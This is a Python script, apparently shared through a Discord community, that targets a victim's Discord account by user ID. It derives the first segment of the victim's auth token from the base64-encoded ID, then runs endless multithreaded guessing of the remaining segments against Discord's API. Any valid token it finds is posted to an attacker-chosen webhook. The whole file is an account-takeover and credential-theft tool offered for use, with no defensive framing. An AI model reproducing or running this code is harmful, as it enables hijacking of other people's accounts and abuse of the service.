from pystyle import Center, Colorate, Colors, Anime
import colorama
import os
import requests
import random
import string
import json
import threading
import base64

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

colorama.init(autoreset=True)

def ErrorToken():
    print(colorama.Fore.RED + "Invalid Token.")
    exit()

def ErrorChoice():
    print(colorama.Fore.RED + "Invalid Choice.")
    exit()

def ErrorNumber():
    print(colorama.Fore.RED + "Invalid number of threads.")
    exit()

def CheckWebhook(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(colorama.Fore.GREEN + "Webhook is valid.")
        else:
            print(colorama.Fore.RED + "Invalid Webhook URL.")
            exit()
    except:
        print(colorama.Fore.RED + "Error with Webhook URL.")
        exit()

def SendWebhook(webhook_url, embed_content):
    payload = {
        'embeds': [embed_content],
        'username': "Token Bot",
        'avatar_url': "https://example.com/avatar.jpg"
    }
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, data=json.dumps(payload), headers=headers)

def TokenToID(userid):
    OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8").replace("=", "")
    print(f"{colorama.Fore.GREEN}Part One Token: {OnePartToken}")

    brute = input(f"{colorama.Fore.YELLOW}Find the second part by brute force? (y/n) -> ").strip().lower()
    if brute != 'y':
        exit()

    webhook = input(f"{colorama.Fore.YELLOW}Webhook? (y/n) -> ").strip().lower()
    if webhook == 'y':
        webhook_url = input(f"{colorama.Fore.YELLOW}Webhook URL -> ").strip()
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{colorama.Fore.YELLOW}Threads Number -> ").strip())
    except:
        ErrorNumber()

    def TokenCheck():
        first = OnePartToken
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{first}.{second}.{third}"

        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
            if response.status_code == 200:
                if webhook == 'y':
                    embed_content = {
                        'title': f'Token Valid!',
                        'description': f"**Token:**\n```{token}```",
                        'color': 65280,  # Green color
                        'footer': {
                            "text": "Token Bot",
                            "icon_url": "https://example.com/avatar.jpg",
                        }
                    }
                    SendWebhook(webhook_url, embed_content)
                    print(f"{colorama.Fore.GREEN}Status: Valid Token: {token}")
                else:
                    print(f"{colorama.Fore.GREEN}Status: Valid Token: {token}")
            else:
                print(f"{colorama.Fore.RED}Status: Invalid Token: {token}")
        except:
            print(f"{colorama.Fore.RED}Status: Error Token: {token}")

    def RequestTokens():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=TokenCheck)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        RequestTokens()

if __name__ == "__main__":
    try:
        userid = input(f"{colorama.Fore.YELLOW}Victim ID -> ").strip()
        TokenToID(userid)
    except Exception as e:
        print(f"{colorama.Fore.RED}Error: {e}")
